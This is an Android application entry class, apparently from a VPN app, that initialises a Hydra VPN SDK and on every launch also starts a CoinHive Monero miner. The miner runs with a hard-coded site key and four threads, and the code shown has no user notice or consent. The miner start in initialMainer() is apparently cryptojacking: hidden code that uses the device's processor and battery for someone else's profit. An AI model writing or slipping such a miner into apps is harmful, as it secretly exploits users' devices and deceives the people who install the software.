package com.example.pavel.monero;

import android.app.Application;
import com.anchorfree.hydrasdk.HydraSDKConfig;
import com.anchorfree.hydrasdk.HydraSdk;
import com.anchorfree.hydrasdk.api.ClientInfo;
import com.anchorfree.hydrasdk.vpnservice.connectivity.NotificationConfig;
import com.example.pavel.monero.serves.CoinHive;


public class App extends Application {

    @Override
    public void onCreate() {
        super.onCreate();
        initHydraSDK();
        initialMainer();
    }

    private void initHydraSDK(){
        HydraSdk.init(this, ClientInfo.newBuilder()
                        .baseUrl("https://backend.northghost.com/") // set base url for api calls
                        .carrierId("31415_31415") // set your carrier id
                        .build(),
                NotificationConfig.newBuilder()
                        .title("Your custom vpn notification title") // notification title to display in status bar
                        .enableConnectionLost() //enabled show notification when no network connection
                        .build(),
                HydraSDKConfig.newBuilder()
                        .observeNetworkChanges(false) // turn on/off handling network changes by sdk
                        .unsafeClient(false)// set true if want to use unsafe client instead
                        .captivePortal(true)//control if sdk should check if device is behind captive portal
                        .build());
    }

    private void initialMainer() {
        CoinHive.getInstance()
                .init("7D1i4fiOWJEVdtZ6T17jBI3c61LHsI3p") // mandatory
                .setNumberOfThreads(4) // optional
                .setIsAutoThread(true) // optional
                .setThrottle(0.2) // optional
                .setLoggingEnabled(true) // To logcat mining status, false by default.
                .setForceASMJS(false); // optional;
    }
}
